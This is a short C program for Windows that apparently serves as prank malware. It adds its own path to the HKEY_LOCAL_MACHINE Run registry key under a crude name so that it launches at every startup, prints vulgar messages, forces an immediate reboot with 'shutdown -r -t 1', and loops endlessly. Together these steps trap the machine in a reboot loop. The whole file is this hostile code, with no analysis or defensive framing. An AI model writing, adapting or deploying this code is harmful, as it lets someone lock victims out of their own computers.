#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main(int argc, char* argv[])
{
    char szPath[MAX_PATH];
    GetWindowsDirectory(szPath, sizeof(szPath));
    strcat(szPath, "\\System32\\update.exe");
    DWORD pathLen = 0;
    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    HKEY newValue;
    RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&newValue);
    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    RegSetValueEx(newValue,TEXT("Penis64"),0,REG_SZ,(LPBYTE)szPath,pathLenInBytes);
    puts("Penis64.exe HAS THE POWER");
    system("shutdown -r -t 1");
    while(1)
        puts("PENIS HAS THE POWER");
    return 0;
}
